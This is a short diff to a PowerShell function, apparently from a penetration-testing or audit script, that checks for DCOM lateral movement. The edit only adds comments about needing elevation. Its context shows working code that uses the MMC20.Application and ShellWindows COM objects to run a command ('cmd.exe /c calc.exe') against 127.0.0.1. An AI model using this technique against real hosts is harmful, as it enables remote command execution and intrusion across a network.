@@ -1318,7 +1318,7 @@ function checkDCOMLateralMovement {
                  # Check specifically for MMC20.Application
                  if ($appName -like "*MMC20*") {
                     Write-Output "[+] Found MMC20.Application: $appID"
-                    # Here we can directly execute a command via MMC20.Application
+                    # Here we can directly execute a command via MMC20.Application - This only makes sense if it's elevated though
                     try {
                         $com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "127.0.0.1")) # Example IP
                         $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "/c calc.exe")
@@ -1331,7 +1331,7 @@ function checkDCOMLateralMovement {
                 # Check specifically for ShellWindows
                 if ($appName -eq "ShellWindows") { # ShellWindows CLSID
                     Write-Output "[+] Found ShellWindows: $appID"
-                    # Execute a command via ShellWindows
+                    # Execute a command via ShellWindows - This only makes sense if it's elevated though... left it for now
                     try {
                         $com = [Type]::GetTypeFromCLSID($appID)
                         $obj = [System.Activator]::CreateInstance($com)
